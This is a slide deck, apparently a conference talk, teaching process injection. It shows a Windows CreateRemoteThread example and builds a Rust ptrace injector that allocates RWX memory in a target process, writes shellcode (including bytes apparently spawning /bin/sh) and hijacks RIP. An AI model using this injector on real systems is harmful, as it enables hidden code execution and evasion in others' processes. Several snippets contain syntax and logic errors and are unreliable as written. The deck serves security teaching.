---
theme: the-unnamed
class: text-center
drawings:
  persist: false
transition: slide-left
mdc: true
---

# Unix Process Injection
A Primer by Keiran Smith


<div class="abs-b m-6 text-m">
  <a href="https://github.com/affix" target="_blank" class="slidev-icon-btn">
    <carbon:logo-github /> Affix
  </a>
  <a href="https://twitter.com/AffixSec" target="_blank" class="slidev-icon-btn">
    <carbon:logo-twitter /> AffixSec
  </a>
  <a href="https://keiran.scot" target="_blank" class="slidev-icon-btn">
    <carbon:link /> keiran.scot
  </a>
</div>

<!--
The last comment block of each slide will be treated as slide notes. It will be visible and editable in Presenter Mode along with the slide. [Read more in the docs](https://sli.dev/guide/syntax.html#notes)
-->

--- #2


# What is Process Injection?

Simply put, Process injection allows an attacker to run their code in the context of another process. This can be used to evade detection, escalate privileges, or even to maintain persistence on a system.

<div v-click>

# Why is it possible?

- Debugging
- Instrumentation
- Security and Forensics
- Inter Process Communication (IPC)
</div>

--- #3

# Process Injection Techniques

There are a number of ways to inject code into a process, some of the most common are:

- DLL Injection
- Process Hollowing
- Remote Thread Injection

<br />
<div v-click class="text-2xl">
  <span v-mark.underline="true">
    Thread Execution Hijacking
  </span>
</div>

<div v-click click="2">
  This technique is used to inject code into a remote process by redirecting execution flow in the target process and writing the code to be executed into the memory of the target process.

  We will be focusing on this technique today.
</div>

--- #4

# Remote Thread Injection in Windows

Before we dive into the Unix part, let's take a look at how Remote Thread Injection works in Windows.

1. Open the target process
2. Allocate memory in the target process
3. Write the code to be executed into the allocated memory
4. Create a new thread in the target process
5. Profit!

--- #5

# Remote Thread Injection in Windows, The Code

```c
unsigned char shellcode[] = {
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // Just Nops
};
DWORD pid = GetProcessIdFromName("explorer.exe");
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
LPVOID pRemoteShellcode = VirtualAllocEx(
                          hProcess, 
                          NULL, 
                          sizeof(shellcode), 
                          MEM_COMMIT | MEM_RESERVE, 
                          PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteShellcode, shellcode, sizeof(shellcode), NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);
```
<br />
<div v-click>
Simples!
</div>

<div v-click>
These are all part of the Windows API, and are included using the `windows.h` header file.
</div>

--- #6
layout: center
---

# So, how do we do this in Unix?
<div v-click>
  PTRACE, PTRACE, PTRACE!
</div>

--- #7

# What the hell is ptrace?

In Unix, ptrace is a syscall that provides a way for a parent process to observe and control the execution of another process.

It is used by debuggers and other code analysis tools to inspect and <span v-mark="{at: 2, type: 'circle', color: 'orange'}">manipulate the execution</span> of a process.

--- #8

# Unix Hurdles to Overcome

<div v-click>

- Finding a Target Process by name is tedious
  - This involved inspecting the `/proc` tree and looping through each process to find the `cmdline` file.
  - I'll be making use of a library to do this
</div>

<div v-click>

- Allocating remote memory involves using `mmap`
  - To make this syscall we need to setup the registers manually then single step the execution of the target process.
  - `rax`, `rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9` are all used to pass arguments to the syscall.
</div>

<div v-click>

- Writing the shellcode to the memory needs to be done carefully.
  - This is done in chumks of 8 bytes at a time using `PTRACE_POKEDATA`.
</div>

<div v-click>

- Executing the shellcode is done by setting the value of `RIP` to the address of the injected shellcode.
</div>

<div v-click>

- I'm doing this in Rust using the libc crate
  - The ptrace syscalls are syntactically similar to the C version
</div>

--- #9

# Rust Specifics

### Mutatable Variables

In order to change variable contents they must be declared as mutable with the `mut` keyword.

```rust
let mut regs = std::mem::zeroed();
```
<br />

### Array / Slice sizes

When using arrays or slices, the size must be specified.

```rust
let shellcode: [0u8; 21] = [
        0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52,
        0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05
];
```

--- #10

# Rust Specifics

### Error Handling

Rust uses the `Result` type for error handling. This is similar to `Option` but includes an error message. You also use match statements to handle the error.

```rust
let pid = get_pid("firefox").unwrap_or_else(|e| {
    match e {
        Error::ProcessNotFound => {
            eprintln!("Process not found");
        }
        _ => {
            eprintln!("Error: {}", e);
        }
    }
    std::process::exit(1);
});
```

Alternatively you can just unwrap the result and panic if there is an error.

```rust
let pid = get_pid("firefox").unwrap();
```

--- #11

# Creating a rust project

To create a new Rust project you can use the `cargo` command.

```bash
cargo new --bin ptrace_inject
```

This will create a new binary project with the name `ptrace_inject`. Change into this directory and open the `src/main.rs` file.

### Adding dependencies

To add dependencies (Known as Crates) to your project you can add them to the `Cargo.toml` file.

```toml
[dependencies]
libc = "0.2.169"
sysinfo = "0.33.1"
```

The `sysinfo` crate is used to get the process ID from the process name.


--- #12

# Using Rust libraries

To use the libc and sysinfo crates in your project you need to import them at the top of your file, You will notice the libc create is used to import the PTRACE constants, ptrace function and the user_regs_struct struct.

```rust
use libc::{
    pid_t, ptrace, sysconf, user_regs_struct, waitpid, PTRACE_ATTACH, PTRACE_DETACH,
    PTRACE_GETREGS, PTRACE_POKEDATA, PTRACE_POKETEXT, PTRACE_SETREGS, PTRACE_SINGLESTEP,
    _SC_PAGESIZE,
};
use std::io;
use sysinfo::System;
```
<br />

### Declaring some constants

```rust
const NULL_PTR: *mut libc::c_void = std::ptr::null_mut::<libc::c_void>();
const PROCESS_NAME: &str = "sleep";
```

These constants will be used in later functions to specify the process name and a null pointer.

--- #13
layout: two-cols
---

# Get Process by Name

```rust
fn get_process_id_by_name(name: &str) -> Option<i32> {
    let mut system = System::new_all();
    system.refresh_all();
    for (_, process) in system.processes() {
        if process.name() == name {
            return Some(process.pid().as_u32() as i32);
        }
    }
    None
}
```

::right::

The get_process_id_by_name function takes a string as an argument and returns an `Option<i32>` which is the process ID of the process with the given name.

We call this function with the `match` statement to handle the result.

```rust

fn main() {
    match get_process_id_by_name(PROCESS_NAME) {
        Some(pid) => {
            println!("PID: {}", pid);
        }
        None => {
            println!("Process not found");
        }
    }
}
```

Assuming the process `PROCESS_NAME` is running, this will print the process ID to stdout.

--- #14

# Attach to the process

In order to manipulate the target process we need to attach to it using the `ptrace` function. This is an `unsafe` function as it can cause undefined behaviour if used incorrectly.

<div v-click>
```rust
unsafe {
    ptrace(PTRACE_ATTACH, pid, NULL_PTR, NULL_PTR);
    waitpid(pid, std::ptr::null_mut(), 0);
}
```
</div>

<div v-click>

The `PTRACE_ATTACH` constant is used to specify the action to be taken by the `ptrace` function. `PTRACE_ATTACH` will send a `SIGSTOP` signal to the target process to stop the process. The `waitpid` function is used to wait for the process to stop, This is a blocking action and will prevent our injection process from executing until the target is stopped.
</div>

--- #15

# Allocate memory in the target process

To allocate memory in the target process we need to use the `mmap` syscall. This is done by setting the registers to the correct values and then calling the `ptrace` function with the `PTRACE_SETREGS` constant.

### Backing up the original registers

First we need to backup the original registers so we can restore them later.

```rust
fn allocate_remote_memory(target_pid: pid_t, size: usize) -> Result<u64, io::Error> {
    unsafe {
        let mut regs: user_regs_struct = std::mem::zeroed();
        ptrace(
            PTRACE_GETREGS,
            target_pid,
            NULL_PTR,
            &mut regs,
        );
        let orig_regs = regs;

    }
}
```

--- #16

# Allocate memory in the target process

### Aligning the memory

The allocated memory size needs to be aligned to the size of the page. This is done by using the `sysconf` function to get the page size and then aligning the memory address to this value.

```rust
fn allocate_remote_memory(target_pid: pid_t, size: usize) -> Result<u64, io::Error> {
    unsafe {
      ...
      let page_size = sysconf(_SC_PAGESIZE) as usize;
      let aligned_size = (((size + page_size - 1) / page_size) * page_size) as u64;
    }
}
```

--- #17

# Allocate memory in the target process

### Calling mmap

Now that the memory size is aligned with the page size we can allocate the memory using the `mmap` syscall. First we prepare the registers with the correct values and then call the `ptrace` function with the `PTRACE_SETREGS` constant.

```rust
      ...
      regs.rax = libc::SYS_mmap as u64;
      regs.rdi = 0; // Address to allocate, Setting to 0 will let the kernel choose
      regs.rsi = aligned_size; // Size of allocated memory
      regs.rdx = (libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC) as u64; // RWX
      regs.r10 = (libc::MAP_ANONYMOUS | libc::MAP_PRIVATE) as u64; // Flags
      regs.r8 = u64::MAX; // File descriptor
      regs.r9 = 0; // Offset

      ptrace(PTRACE_SETREGS, target_pid, NULL_PTR, &regs);
      ptrace(PTRACE_POKETEXT, target_pid, regs.rip as *mut libc::c_void, 0x050f); // Set RIP to the address of syscall
      ptrace(PTRACE_SINGLESTEP, target_pid, NULL_PTR, NULL_PTR);
      waitpid(target_pid, std::ptr::null_mut(), 0);
      ...
```
--- #18

# Allocate memory in the target process

### Getting the return value of mmap and restoring the registers

The return value of the mmap syscall is the address of the allocated memory. We can get this value by reading the `RAX` register after the syscall has executed.

```rust
      ...
      ptrace(PTRACE_GETREGS, target_pid, NULL_PTR, &mut regs);
      if allocated_address == 0 || allocated_address == u64::MAX {
        println!("Error: {}", io::Error::last_os_error());
        return Err(io::Error::new(
            io::ErrorKind::Other,
            "Invalid memory address allocated",
      ));

      ptrace(PTRACE_POKETEXT, target_pid, regs.rip as *mut libc::c_void, original_regs.rip as *mut libc::c_void);
      if ptrace(PTRACE_SETREGS, target_pid, NULL_PTR, &original_regs) == -1 {
          return Err(io::Error::last_os_error());
      }

      Ok(allocated_address)
```

--- #19

# Writing the shellcode to the allocated memory

Now the memory has been allocated we can write the shellcode to the memory. To do this we need to write the shellcode in chunks of 8 bytes at a time using the `PTRACE_POKEDATA` constant. We must make sure the shellcode is aligned to 8 bytes, This is done by adding a NOP sled.

```rust
fn write_shellcode(pid: pid_t, mut address: u64, shellcode: &[u8]) -> Result<(), std::io::Error> {
    println!("Writing shellcode to address: 0x{:x} in process id {}", address, pid);
    let mut padded_shellcode = shellcode.to_vec();
    while padded_shellcode.len() % 8 != 0 {
        padded_shellcode.push(0x90); // NOP sled padding
    }
```

--- #20

# Writing the shellcode to the allocated memory

### Blowing chunks

```rust
    unsafe {
        let mut data = [0u8; 8];

        for (_, chunk) in padded_shellcode.chunks(8).enumerate() {
            for (j, &byte) in chunk.iter().enumerate() {
                data[j] = byte;
            }

            let word = u64::from_le_bytes(data);
            if ptrace(PTRACE_POKEDATA, pid, address as *mut libc::c_void, word as *mut libc::c_void) == -1 {
                return Err(std::io::Error::last_os_error());
            }

            address += 8;
        }
    }

    Ok(())
}
```

--- #21

# Executing, Execute, Execute!

Now the easy part, We just need to set the `RIP` register to the address of the shellcode and the target process will execute the shellcode.

```rust
fn execute_shellcode_at_address(address: u64, pid: pid_t) -> Result<(), std::io::Error> {
    unsafe {
        let mut regs: user_regs_struct = std::mem::zeroed();
        ptrace(PTRACE_GETREGS, pid, NULL_PTR, &regs);
        ptrace(PTRACE_POKETEXT, pid, regs.rax as *mut libc::c_void, address - 2);
        regs.rip = address + 8 + 2; // +2 to skip the SYSCALL instruction
        println!("Setting RIP to 0x{:x}", regs.rip);
        ptrace(PTRACE_SETREGS, pid, NULL_PTR, &regs);
    }
    Ok(())
}
```

--- #22

# Putting it all together

The code in GitHub has full error handling in the `main()` function. For brevity the code here does not.

```rust
fn main() {
    let pid = get_process_id_by_name(PROCESS_NAME).unwrap();
    unsafe {
        ptrace(PTRACE_ATTACH, pid, NULL_PTR, NULL_PTR);
        waitpid(pid, std::ptr::null_mut(), 0);
    }

    let address = allocate_remote_memory(pid, shellcode.len()).unwrap();
    write_shellcode(pid, address, &shellcode).unwrap();
    execute_shellcode_at_address(address, pid).unwrap();

    unsafe {
        ptrace(PTRACE_DETACH, pid, NULL_PTR, NULL_PTR);
    }
}
```

--- #23
layout: center
---

# DEMO TIME!

Lets see how it works

--- #24

# Why won't this work on MacOS?

The Darwin Kernel, which is the core of MacOS, has a number of security features that prevent this kind of process manipulation. 

Apple also made the decision to not include PTRACE_GETREGS, PTRACE_POKETEXT, PTRACE_SETREGS and PTRACE_PEEKTEXT from the Darwin Kernel.

# Process Injection in macOS

To perform process injection on MacOS you would need to use a different technique such as Mach-O code injection, DYLIB injection.

An alternative would be thread injection via task-port.





--- #25
layout: center
---

# Thank you!

Any Questions?